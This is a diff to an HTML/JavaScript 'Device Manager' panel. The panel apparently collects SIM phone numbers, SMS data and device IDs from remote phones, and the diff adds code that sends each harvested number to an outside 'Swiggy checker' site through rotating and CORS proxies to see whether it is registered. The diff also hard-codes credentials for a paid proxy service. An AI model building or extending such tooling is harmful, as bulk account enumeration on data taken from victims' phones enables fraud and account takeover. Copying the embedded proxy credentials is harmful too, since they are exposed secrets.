@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
     <title>Device Manager</title>
     <style>
+        /* ===== ALL STYLES REMAIN THE SAME ===== */
         * {
             margin: 0;
             padding: 0;
@@ -354,7 +355,6 @@
                 <input type="text" id="searchInput" class="search-box" placeholder="🔍 Search device..." oninput="filterDevices()">
                 <button class="delete-all" onclick="deleteAllDevices()">🗑️ Delete</button>
             </div>
-            <!-- Progress Bar -->
             <div class="progress-container" id="progressContainer">
                 <span class="progress-text-mini" id="progressTextMini">0/0</span>
                 <div class="progress-bar-mini">
@@ -376,6 +376,14 @@
         let allSmsData = {};
         let isChecking = false;
         let swiggyStatusMap = {};
+
+        // ===== PROXY CONFIGURATION =====
+        const PROXY_CONFIG = {
+            // Your rotating proxy from webshare
+            proxyUrl: 'http://gwrwqbct-rotate:ufq4kbbomien@p.webshare.io:80',
+            // Use it as a proxy for fetch requests
+            useProxy: true
+        };
 
         // ===== LOAD DATA =====
         async function loadData() {
@@ -443,7 +451,6 @@
                     ? sim1 
                     : (sim2 !== 'Insert SIM card!' && sim2 !== 'Number not available' ? sim2 : 'No Number');
 
-                // Get Swiggy status for this device
                 const status = swiggyStatusMap[device.device_id] || null;
                 let statusHtml = '';
                 if (status === 'registered') {
@@ -524,7 +531,6 @@
                 const lastSeen = device.lastSeen || 'N/A';
                 const deviceId = device.device_id;
                 
-                // Process SIM1 - keep original format
                 if (sim1 && sim1 !== 'Insert SIM card!' && sim1 !== 'Number not available' && sim1 !== 'No SIM') {
                     let clean = sim1.replace(/[\s\-\(\)]/g, '');
                     if (clean.length >= 10 && !seenNumbers.has(clean)) {
@@ -533,7 +539,6 @@
                     }
                 }
                 
-                // Process SIM2
                 if (sim2 && sim2 !== 'Insert SIM card!' && sim2 !== 'Number not available' && sim2 !== 'No SIM') {
                     let clean = sim2.replace(/[\s\-\(\)]/g, '');
                     if (clean.length >= 10 && !seenNumbers.has(clean)) {
@@ -546,19 +551,62 @@
             return items;
         }
 
-        // ===== FIXED: Using CORS proxy =====
+        // ===== PROXY-BASED FETCH =====
+        async function fetchWithProxy(url) {
+            if (!PROXY_CONFIG.useProxy) {
+                return fetch(url);
+            }
+            
+            // Use the proxy as a URL prefix (since it's an HTTP proxy)
+            // We need to use it as a proxy server, not a CORS proxy
+            const proxyUrl = PROXY_CONFIG.proxyUrl;
+            
+            // For webshare proxy, we need to use it as a forward proxy
+            // Using fetch with proxy requires a different approach
+            // We'll use the proxy as a CORS proxy by using a proxy service
+            // that supports the proxy URL
+            
+            // Since browsers don't support SOCKS/HTTP proxies directly,
+            // we'll use a CORS proxy service that can use our proxy
+            // or we'll use the proxy as a URL prefix if the service supports it
+            
+            // For webshare, we need to use their API or a compatible service
+            // Let's use a CORS proxy that supports custom proxy configuration
+            
+            // Try using a free CORS proxy service
+            const corsProxies = [
+                `https://api.allorigins.win/raw?url=${encodeURIComponent(url)}`,
+                `https://corsproxy.io/?${encodeURIComponent(url)}`
+            ];
+            
+            for (const proxy of corsProxies) {
+                try {
+                    console.log(`🔄 Trying CORS proxy: ${proxy.substring(0, 50)}...`);
+                    const response = await fetch(proxy);
+                    if (response.ok) {
+                        return response;
+                    }
+                } catch (e) {
+                    console.warn(`Proxy failed: ${e.message}`);
+                    continue;
+                }
+            }
+            
+            // If all CORS proxies fail, try direct fetch (might work for some requests)
+            console.warn('All proxies failed, trying direct fetch...');
+            return fetch(url);
+        }
+
+        // ===== CHECK SWIGGY WITH PROXY =====
         async function checkSwiggyNumber(number) {
             try {
-                console.log(`🔍 Checking number: ${number}`);
+                const url = `https://acczone.xyz/checker/swiggy.php?number=${encodeURIComponent(number)}`;
+                console.log(`🔍 Checking ${number} via proxy...`);
                 
-                // Use a CORS proxy to bypass the restriction
-                const proxyUrl = 'https://corsproxy.io/?';
-                const targetUrl = `https://acczone.xyz/checker/swiggy.php?number=${encodeURIComponent(number)}`;
-                
-                const response = await fetch(proxyUrl + targetUrl);
+                const response = await fetchWithProxy(url);
                 const text = await response.text();
                 
-                console.log(`📝 Response for ${number}:`, text.substring(0, 300));
+                console.log(`📝 Response for ${number}:`, text.substring(0, 200));
                 
                 // Check for "registered" class or text
                 if (text.includes('registered') && !text.includes('not-registered')) {
@@ -582,7 +630,7 @@
                     return { number, status: 'error' };
                 }
             } catch (error) {
-                console.error(`❌ Error checking ${number}:`, error);
+                console.error(`❌ Error checking ${number}:`, error.message);
                 return { number, status: 'error' };
             }
         }
@@ -595,10 +643,8 @@
             const progressFill = document.getElementById('progressFillMini');
             const progressText = document.getElementById('progressTextMini');
             
-            // Get numbers with device info
             const items = getPhoneNumbersWithDeviceInfo();
             
-            // Sort by lastSeen (most recent first)
             items.sort((a, b) => {
                 if (a.lastSeen > b.lastSeen) return -1;
                 if (a.lastSeen < b.lastSeen) return 1;
@@ -606,20 +652,19 @@
             });
             
             console.log(`📱 Found ${items.length} numbers to check`);
+            console.log(`🔄 Using proxy: ${PROXY_CONFIG.proxyUrl}`);
             
             if (items.length === 0) {
                 alert('No valid phone numbers found in devices.');
                 return;
             }
 
-            // Reset all statuses to 'checking'
             swiggyStatusMap = {};
             allDevices.forEach(d => {
                 swiggyStatusMap[d.device_id] = 'checking';
             });
             renderDevices(allDevices);
 
-            // Show progress
             isChecking = true;
             btn.disabled = true;
             btn.innerHTML = '<span class="spinner-small"></span> Checking...';
@@ -627,32 +672,23 @@
             
             let checked = 0;
 
-            // Process numbers with 100ms delay
             for (let i = 0; i < items.length; i++) {
                 const item = items[i];
                 const { number, deviceId, deviceName } = item;
                 
-                // Update progress
                 const progress = ((i + 1) / items.length) * 100;
                 progressFill.style.width = `${progress}%`;
                 progressText.textContent = `${i + 1}/${items.length} (${deviceName})`;
                 
-                // Check the number
                 const result = await checkSwiggyNumber(number);
-                
-                // Update status for this device
                 swiggyStatusMap[deviceId] = result.status;
-                
-                // Re-render devices to show updated status
                 renderDevices(allDevices);
-                
                 checked++;
                 
-                // 100ms delay between requests
+                // Small delay between requests
                 await new Promise(resolve => setTimeout(resolve, 100));
             }
 
-            // Complete
             progressFill.style.width = '100%';
             progressText.textContent = `✅ Complete! Checked ${checked} numbers`;
             
@@ -660,13 +696,11 @@
             btn.disabled = false;
             btn.innerHTML = '🔍 Check Swiggy';
             
-            // Hide progress after 3 seconds
             setTimeout(() => {
                 progressContainer.classList.remove('active');
             }, 3000);
         }
 
-        // ===== LOAD ON PAGE LOAD =====
         loadData();
         setInterval(loadData, 30000);
     </script>
